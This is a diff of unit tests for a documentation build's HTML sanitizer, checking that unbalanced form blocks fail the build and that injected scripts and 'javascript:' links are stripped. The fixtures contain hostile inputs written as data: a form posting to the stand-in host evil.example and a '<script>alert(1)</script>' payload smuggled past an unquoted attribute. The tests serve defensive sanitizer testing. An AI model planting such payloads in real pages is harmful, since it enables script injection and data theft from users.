@@ -898,8 +898,7 @@ describe('unit - handbook build guards', () => {
     assert.match(r.stderr, /unbalanced <script>/i);
   });
 
-  // <form> is stripped with the same non-greedy pair regex as script, but was
-  // not in the balance-check tag list. An unclosed form must fail closed.
+  // <form> is a danger block like script. An unclosed form must fail closed.
   it('fails the build on unbalanced form blocks instead of silent content loss', function () {
     const { fixture, out } = freshDirs();
     const danger = '# Title\n\n' + '<div><form action="https://evil.example/collect">UNCLOSED-FORM</div>\n';
@@ -1020,10 +1019,7 @@ describe('unit - handbook build guards', () => {
       NODE_PATH: markedNodePath,
       GIT_SHA: 't',
     });
-    if (r.status !== 0) {
-      assert.match(r.stderr, /sanitizer/i);
-      return;
-    }
+    assert.strictEqual(r.status, 0, r.stderr);
     const html = fs.readFileSync(path.join(out, 'docs/DOC-0.html'), 'utf8');
     const body = html.replace(/^[\s\S]*?<body[^>]*>/i, '').replace(/<\/body>[\s\S]*$/i, '');
     assert.ok(body.includes('KEEP-RECONSTITUTE'));
@@ -1076,6 +1072,29 @@ describe('unit - handbook build guards', () => {
     const body = html.replace(/^[\s\S]*?<body[^>]*>/i, '').replace(/<\/body>[\s\S]*$/i, '');
     assert.ok(body.includes('KEEP-XLINK'));
     assert.ok(!new RegExp('java' + 'script:', 'i').test(body), 'xlink:href javascript scheme neutralized');
+  });
+
+  // A `"` inside an unquoted value must not put the walker into quote mode
+  // through a later script tag. Browsers close the tag at the first `>`.
+  it('strips a script after an unquoted attribute that contains a quote', function () {
+    const { fixture, out } = freshDirs();
+    const danger =
+      '# Title\n\n' + '<p>KEEP-UNQUOTED-QUOTE</p>\n\n' + '<div data-x=x"><script>alert(1)</script>"></div>\n';
+    populateValidFixture(fixture, {
+      shotSize: MIN_PNG_BYTES + 1,
+      docContents: { 'DOC-0.md': danger },
+    });
+    const r = runBuild(out, {
+      HANDBOOK_REPO_ROOT: fixture,
+      NODE_PATH: markedNodePath,
+      GIT_SHA: 't',
+    });
+    assert.strictEqual(r.status, 0, r.stderr);
+    const html = fs.readFileSync(path.join(out, 'docs/DOC-0.html'), 'utf8');
+    const body = html.replace(/^[\s\S]*?<body[^>]*>/i, '').replace(/<\/body>[\s\S]*$/i, '');
+    assert.ok(body.includes('KEEP-UNQUOTED-QUOTE'));
+    assert.ok(!/<script\b/i.test(body), 'script after unquoted quote must be stripped');
+    assert.ok(!/alert\(1\)/i.test(body), 'script body after unquoted quote must not remain');
   });
 
   // Guard used to treat an unquoted src ending in `/` as a self-close
